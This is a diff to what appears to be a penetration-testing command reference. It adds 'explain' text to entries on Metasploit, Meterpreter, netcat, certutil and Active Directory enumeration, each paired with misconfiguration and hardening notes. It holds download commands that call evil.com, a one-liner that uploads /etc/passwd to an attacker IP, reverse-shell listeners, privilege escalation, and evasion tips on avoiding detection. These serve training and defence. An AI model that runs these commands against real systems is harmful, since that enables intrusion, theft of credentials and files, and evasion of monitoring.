         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
-      }
+      },
+      "explain": "Pulls a file onto a Linux host over HTTP with wget:\n  wget <url>    request the file\n  -O /tmp/out.sh   write it to this path\nSaves the file locally; pipe to bash/python for fileless execution, or fall back to bash's built-in /dev/tcp when neither wget nor curl exists."
     },
     {
       "id": "mimipenguin",
@@ -42032,7 +42161,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
-      }
+      },
+      "explain": "Copies a file over SSH using scp:\n  <user>@<ip>:/path/file   remote source (user and host to authenticate as)\n  .                        local destination (current directory)\nMoves the file encrypted over port 22; swap the argument order to push instead of pull, and start sshd on your box first to receive uploads."
     },
     {
       "type": "command",
@@ -42165,7 +42295,8 @@ const COMMAND_DATA = {
           "command": "python3 -c 'import requests;requests.post(\"http://<ip>:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'",
           "label": "python3"
         }
-      ]
+      ],
+      "explain": "Exfiltrates a file to your attack box over an encrypted HTTPS uploadserver:\n  curl -X POST https://<ip>/upload   POST to the uploadserver's upload endpoint\n  -F 'files=@/etc/passwd'            attach the file as multipart form data\n  --insecure                         accept the self-signed cert\nUploads the file over TLS so creds are not sent in cleartext; run 'python3 -m uploadserver 443 --server-certificate' on your side first."
     },
     {
       "id": "passwd-write-lpe",
@@ -42388,7 +42519,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
-      }
+      },
+      "explain": "Downloads a file using certutil.exe, a trusted signed Windows binary, to dodge app allow-listing:\n  -urlcache   use the URL cache download path\n  -split      write the raw file (split off the cert wrapper)\n  -f          force overwrite / refetch\n  http://<ip>:8000/nc.exe nc.exe   remote source and local filename\nThe download looks like normal signed-binary activity; bitsadmin, certreq, and other LOLBAS entries do the same job."
     },
     {
       "id": "crtp-llmnr-poisoning",
@@ -42576,7 +42708,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Failure to enumerate ETW provider coverage leaves defenders blind to detection gaps. Not knowing which providers produce which telemetry = inability to identify when ETW tampering has occurred. Not configuring custom trace sessions for high-value providers (e.g., Microsoft-Windows-DotNETRuntime) = missing .NET-based attack telemetry.",
         "vulnerable_config": "# Default Windows - no custom ETW sessions configured\n# Only built-in Event Log sessions active\nlogman query -ets\n# Result: Only EventLog-Application, EventLog-Security, EventLog-System visible\n# Microsoft-Windows-DotNETRuntime events NOT captured\n# Microsoft-Windows-Kernel-Process events NOT captured",
         "secure_config": "# Verify ETW coverage - run as part of baseline\nlogman query -ets\n# Should show custom sessions for high-value providers:\n#   SilkETW sessions for DotNETRuntime, Kernel-Process\n#   Any EDR provider sessions\n\n# Create a persistent custom trace session for .NET telemetry:\nlogman create trace DotNETTrace -p Microsoft-Windows-DotNETRuntime 0x2038 4 -o C:\\ETWLogs\\dotnet.etl -ets\n\n# Monitor for ETW tamper events:\n# Sysmon Rule: detect WriteProcessMemory to ntdll.dll EtwEventWrite offset"
-      }
+      },
+      "explain": "Lists the currently running ETW trace sessions with the built-in logman tool:\n  logman.exe query   query configured/active data collectors\n  -ets               operate on Event Trace Sessions directly (running traces, not saved collector sets)\nShows what telemetry is being captured on the host; 'logman query providers' lists available ETW providers and their GUIDs so you know what you could subscribe to."
     },
     {
       "type": "command",
@@ -42814,7 +42947,8 @@ const COMMAND_DATA = {
           "label": "Note the domain SID + Enterprise/Domain Admins RIDs",
           "command": "# domain SID = base for forging tickets with /sids"
         }
-      ]
+      ],
+      "explain": "Brute-forces RIDs to enumerate users, groups, and the domain SID:\n  lookupsid.py <domain>/<user>@<dc_ip>   authenticate and walk the SID space\nReturns the domain SID plus account names by RID; it works across trusts, so you can enumerate a foreign domain's users with your current creds - grep for 'Domain SID' to grab the SID for ticket forging."
     },
     {
       "id": "cdsa-lsass-dump-detection",
@@ -43533,7 +43667,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "Disk forensics: Autopsy, MFTECmd, EvtxECmd, Registry Explorer, Timeline Explorer."
         }
-      ]
+      ],
+      "explain": "Analyzes a memory dump with Volatility 3:\n  python vol.py       run Volatility 3\n  -q                  quiet (suppress progress noise)\n  -f PhysicalMemory.raw   the memory image to analyze\n  windows.malfind     plugin that finds PAGE_EXECUTE_READWRITE regions - a code-injection indicator\nFlags injected/hidden code; swap the plugin for pslist, pstree, psscan, cmdline, netscan, etc. to build the full picture of the captured system."
     },
     {
       "id": "msf-virustotal",
@@ -43757,7 +43892,8 @@ const COMMAND_DATA = {
           "description": "Start a SOCKS4a proxy listener in MSF so proxychains can route traffic through the autoroute tunnel"
         }
       ],
-      "type": "command"
+      "type": "command",
+      "explain": "Adds a route through a Meterpreter session so Metasploit modules can reach an internal subnet:\n  run autoroute   the Meterpreter post module\n  -s <subnet>     the internal network to route through this session (e.g. 172.16.5.0/23)\nMSF modules can now hit that subnet; follow with auxiliary/server/socks_proxy to share the route with external proxychains tools."
     },
     {
       "type": "command",
@@ -43859,7 +43995,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
-      }
+      },
+      "explain": "The core Metasploit exploitation loop:\n  msfconsole   launch the framework\nSearch for a module (search eternalblue), 'use' it, 'show options', set RHOSTS/LHOST, optionally 'check' to confirm the target is vulnerable, then 'exploit' to fire and drop into a session."
     },
     {
       "id": "msf-creds",
@@ -46956,7 +47093,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Meterpreter runs entirely in memory (no disk artifact by default)\n# Reflective DLL injection into legitimate process (e.g., explorer.exe)\n# Traditional AV sees no malicious file = no alert\n\n# getsystem succeeds when:\n# - SeImpersonatePrivilege available (IIS/SQL service accounts)\n# - Named pipe impersonation technique works\n# - Kernel exploit token duplication works",
         "secure_config": "# EDR with memory scanning (Defender ATP, CrowdStrike, SentinelOne):\n# Detects reflective DLL injection patterns in memory\n# Detects Meterpreter C2 communication patterns\n\n# Enable Windows Defender Credential Guard:\n# Blocks kiwi from extracting creds from LSASS\n\n# SeImpersonatePrivilege restriction:\n# Remove from non-service accounts\n# Service accounts in Protected Users group where possible\n\n# Application allowlisting (WDAC):\n# Blocks execution of malicious stages even if dropped to disk\n# Blocks unsigned PowerShell scripts used for Meterpreter delivery"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Baseline Meterpreter orientation after landing a session:\n  getuid    show which user the session runs as\n  sysinfo   show the host name, OS, and architecture\n  ps        list running processes (targets for migration or token stealing)\nEstablishes who and where you are before deciding how to escalate or move laterally."
     },
     {
       "id": "meterpreter-shell",
@@ -47059,7 +47197,8 @@ const COMMAND_DATA = {
           "label": "Background (exit/Ctrl+Z)"
         }
       ],
-      "type": "command"
+      "type": "command",
+      "explain": "Drops from Meterpreter into a native OS command shell:\n  shell   spawn and attach to a system shell (cmd.exe or /bin/bash) on the target\nGives you a normal command prompt for commands Meterpreter lacks; press Ctrl+Z (or 'background') to return to the Meterpreter prompt without killing the session, and 'execute -f powershell.exe -i' launches a specific interpreter."
     },
     {
       "id": "meterpreter-hashdump",
@@ -47286,7 +47425,8 @@ const COMMAND_DATA = {
           "label": "Search UAC"
         }
       ],
-      "type": "command"
+      "type": "command",
+      "explain": "Attempts automatic local privilege escalation to SYSTEM:\n  getsystem   try Meterpreter's built-in elevation techniques (named-pipe impersonation, token duplication)\nElevates the session to NT AUTHORITY\\SYSTEM when one technique succeeds; confirm with getuid, and fall back to a UAC-bypass or the local exploit suggester if it fails."
     },
     {
       "id": "meterpreter-kiwi",
@@ -47518,7 +47658,8 @@ const COMMAND_DATA = {
           "label": "Execute notepad"
         }
       ],
-      "type": "command"
+      "type": "command",
+      "explain": "Moves the Meterpreter session into another process:\n  migrate <pid>   relocate into the process with this PID\nMigrating into a stable, higher-integrity process improves session reliability and can inherit that process's privileges; use 'ps' to pick a target, or 'execute -H -f notepad' to spawn a fresh host process first."
     },
     {
       "id": "msf-portfwd",
@@ -47615,7 +47756,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy - direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering - block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring - detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection - detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Creates a TCP relay through a Meterpreter session (portfwd):\n  add                the forward\n  -l <local_port>    port opened on your attack host\n  -p <remote_port>   port on the final target\n  -r <target>        the internal target reached via the pivot\nConnecting to your <local_port> tunnels to <target>:<remote_port>; use -R to forward a pivot-side port back to your host for catching callbacks."
     },
     {
       "id": "meterpreter-steal-token",
@@ -50906,7 +51048,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# PHP - classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL - app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
         "secure_config": "# PHP - parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js - parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users",
         "evasion": "Re-disable xp_cmdshell after use; keep OS command execution minimal; use built-in SQL to read data instead of shelling out."
-      }
+      },
+      "explain": "Connects to MSSQL with Impacket's client using Windows authentication:\n  python3 mssqlclient.py   the Impacket MSSQL client\n  Administrator@<ip>       user and target\n  -windows-auth            authenticate via NTLM/Windows auth (not SQL logins)\nGives an interactive SQL prompt to enumerate databases (select name from sys.databases) and, with rights, run xp_cmdshell; the ms-sql-* NSE scripts and mssql_ping cover discovery."
     },
     {
       "id": "mssql-impersonation",
@@ -51514,7 +51657,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# PHP - classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL - app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
         "secure_config": "# PHP - parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js - parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users",
         "evasion": "Re-disable any risky setting after use; read files via SQL directly; avoid writing webshells where a read suffices."
-      }
+      },
+      "explain": "Logs into MySQL and enumerates its databases:\n  mysql   the client\n  -u root   username\n  -pP4SSw0rd   password (no space after -p)\n  -h <ip>      the server\nOnce connected, 'show databases;', 'use <db>;', 'show tables;', and 'select version();' map the data and version; scan first with nmap --script mysql* to fingerprint and try empty/default creds."
     },
     {
       "type": "command",
@@ -51641,7 +51785,8 @@ const COMMAND_DATA = {
           "command": "# Navigate to: https://localhost:8834\n# Accept self-signed cert, create admin account, enter license key (Nessus Essentials = free, 16-host limit)",
           "label": "Navigate to: https://localhost:883…"
         }
-      ]
+      ],
+      "explain": "Installs the Nessus vulnerability scanner from its Debian package:\n  dpkg -i Nessus-<version>-ubuntu910_amd64.deb   install the downloaded .deb\nAfter 'systemctl start nessusd.service' the web UI is at https://localhost:8834, where you create scans (Basic Network Scan, Credentialed Patch Audit, etc.)."
     },
     {
       "id": "ad-net-commands",
@@ -51768,7 +51913,8 @@ const COMMAND_DATA = {
           "label": "Password policy",
           "command": "net accounts /domain"
         }
-      ]
+      ],
+      "explain": "Enumerates the domain with the built-in net command (LOTL):\n  net <object> /domain   query the domain rather than the local host\nWith no tools to install, 'net user /domain', 'net group \"Domain Admins\" /domain', and 'net accounts /domain' list users, group membership, and the password policy from any domain-joined host."
     },
     {
       "id": "ad-windows-null-session",
@@ -51858,7 +52004,8 @@ const COMMAND_DATA = {
           "label": "Then enumerate with rpcclient",
           "command": "rpcclient -U \"\" -N <dc_ip> -c enumdomusers"
         }
-      ]
+      ],
+      "explain": "Opens a null session to a DC's IPC$ share from Windows:\n  net use \\\\<dc_host>\\ipc$   connect to the inter-process comms share\n  \"\" /u:\"\"                    empty password, empty username (anonymous)\nIf allowed, this enables anonymous RPC enumeration ('net user /domain', 'net group /domain'); rarely works on patched modern Windows but still common on legacy servers."
     },
     {
       "id": "nbtscan-netbios",
@@ -51953,7 +52100,8 @@ const COMMAND_DATA = {
         "misconfiguration": "NetBIOS over TCP/IP enabled by default on Windows NIC bindings. No authentication required to query UDP 137. NetBIOS name responses include domain/workgroup membership and service flags, exposing AD topology to unauthenticated sweepers.",
         "vulnerable_config": "# NetBIOS enabled (default Windows NIC setting)\n# Check via PowerShell:\nGet-WmiObject Win32_NetworkAdapterConfiguration | Select-Object Description, TcpipNetbiosOptions\n# TcpipNetbiosOptions = 0 (Use DHCP) or 1 (Enable) = VULNERABLE\n\n# GPO not applied → UDP 137/138 open on all interfaces\n# Firewall inbound rule for NBT-NS missing or disabled",
         "secure_config": "# Disable NetBIOS via GPO (registry write):\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters\\Interfaces\\Tcpip_{GUID}\\NetbiosOptions = 2\n\n# PowerShell (run on each host or via SCCM/Intune):\n$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True'\nforeach ($a in $adapters) { $a.SetTcpipNetbios(2) }  # 2 = Disable NetBIOS\n\n# Windows Defender Firewall - block inbound NBT:\nNew-NetFirewallRule -DisplayName 'Block NBT-NS Inbound' -Direction Inbound -Protocol UDP -LocalPort 137,138 -Action Block\n\n# Perimeter ACL:\n# deny udp any any eq 137\n# deny udp any any eq 138"
-      }
+      },
+      "explain": "Sweeps a subnet for NetBIOS name-service responders:\n  sudo nbtscan   NetBIOS scanner (UDP 137, needs root)\n  -r <cidr>      use source port 137 and scan this range\nQuickly maps Windows hosts with their NetBIOS names, workgroup/domain, and logged-in users before deeper SMB work; nmap --script smb-os-discovery on 139/445 confirms details."
     },
     {
       "type": "command",
@@ -52051,7 +52199,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
-      }
+      },
+      "explain": "Grabs a service banner with a raw netcat connection:\n  nc   the connection tool\n  -n   skip DNS resolution\n  -v   verbose (show connection status)\n  <ip> <port>   what to connect to\nWhatever the service prints on connect fingerprints it (FTP, SSH, SMTP, etc.); add -z with a port range for a quick connect-scan without sending data."
     },
     {
       "type": "command",
@@ -52251,7 +52400,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services",
         "evasion": "Prefer encrypted/HTTPS callbacks, migrate out of the initial process quickly, and avoid signatured default payloads."
-      }
+      },
+      "explain": "Starts a netcat listener to catch a reverse shell:\n  nc   the tool\n  -l   listen mode\n  -v   verbose (report the connection)\n  -n   no DNS resolution\n  -p <port>   the port to listen on\nWhen the target's reverse-shell payload connects back, you get an interactive shell; set your payload's LHOST to this host's tun0 IP."
     },
     {
       "id": "nc-port-scan",
@@ -52360,7 +52510,8 @@ const COMMAND_DATA = {
           "PEN-200 Ch 6",
           "MITRE T1046"
         ]
-      }
+      },
+      "explain": "Does a quick TCP connect scan with netcat when a full scanner is overkill:\n  nc   the tool\n  -n   no DNS resolution\n  -vv  very verbose (report each port)\n  -w 1 one-second per-connection timeout\n  -z   zero-I/O: connect then close without sending data\n  <ip> <port>   target and port (or a range like 3388-3390)\nReports which ports accept a connection; add -u for a UDP sweep."
     },
     {
       "type": "command",
@@ -52463,7 +52614,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
-      }
+      },
+      "explain": "Moves a file over a raw TCP socket with netcat when no HTTP/SMB is available:\n  nc -l -p 8000 > out.exe   receiver: listen on 8000 and write incoming bytes to a file\n  nc -q 0 <ip> 8000 < out.exe   sender: connect and stream the file, then quit on EOF (-q 0)\nStart the receiver first; the file transfers with no protocol overhead (cat < /dev/tcp/... can receive without any nc binary)."
     },
     {
       "id": "ad-netdom-trust",
@@ -52574,7 +52726,8 @@ const COMMAND_DATA = {
           "label": "Cross-check with PowerView",
           "command": "Get-DomainTrust | select SourceName,TargetName,TrustDirection,TrustType"
         }
-      ]
+      ],
+      "explain": "Lists domain trusts with the built-in netdom tool:\n  netdom query   query domain information\n  /domain:<domain>   the domain to inspect\n  trust          ask specifically for trust relationships\nShows trust direction and type (parent-child, forest, external) - the first step before a trust-abuse attack; PowerView's Get-DomainTrust returns the same data."
     },
     {
       "id": "netexec-bruteforce",
@@ -53369,7 +53522,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# /etc/exports - dangerous NFS export:\n/home/user    *(rw,no_root_squash,no_all_squash,sync)\n# '*' = any host can mount\n# 'rw' = read+write\n# 'no_root_squash' = remote root = local root (critical misconfiguration)\n\n# If /home/user/.ssh is on an NFS share:\n# Attacker mounts the share, writes their public key to .ssh/authorized_keys\n# -> SSH in as that user without a password",
         "secure_config": "# /etc/exports - hardened:\n/data/shared    10.10.1.0/24(ro,root_squash,all_squash,sync)\n# Specific subnet only, read-only, root_squash (remote root -> nobody)\n# all_squash: ALL remote users map to anonymous (anonuid/anongid)\n\n# For read-write shares where needed:\n/data/team      10.10.1.100(rw,root_squash,sync,secure)\n# 'root_squash' is the minimum - never use no_root_squash\n# 'secure' = require source port < 1024 (prevents non-root mounting tricks)\n\n# After editing /etc/exports:\nexportfs -ra  # reload exports\nexportfs -v   # verify what's published",
         "evasion": "Mount read-only and copy only needed files; unmount after; no_root_squash abuse (SUID drop) leaves a file - remove it."
-      }
+      },
+      "explain": "Enumerates and mounts NFS exports:\n  showmount -e <ip>   list the exported shares and their allowed clients\nThen scan 111/2049 with the nfs* NSE scripts, mount an export ('mount -t nfs <ip>:/ ./dir -o nolock'), and 'ls -n' to see raw UID/GID - important where the export trusts UIDs (no_root_squash lets you drop root-owned files)."
     },
     {
       "id": "nikto-fingerprint",
@@ -53472,7 +53626,8 @@ const COMMAND_DATA = {
         "fingerprinting",
         "recon",
         "scanner"
-      ]
+      ],
+      "explain": "Scans a web server for misconfigurations and known issues with Nikto:\n  -h <url>       the target host\n  -Tuning b      restrict tests to software identification only (fast, quieter)\nFlags the server software, dangerous files, outdated components, and default creds; drop -Tuning b (or use 0123456789abcde) for a full, noisier scan and -output to save."
     },
     {
       "type": "command",
@@ -53623,7 +53778,8 @@ const COMMAND_DATA = {
           "OSCP Ch07",
           "MITRE T1046"
         ]
-      }
+      },
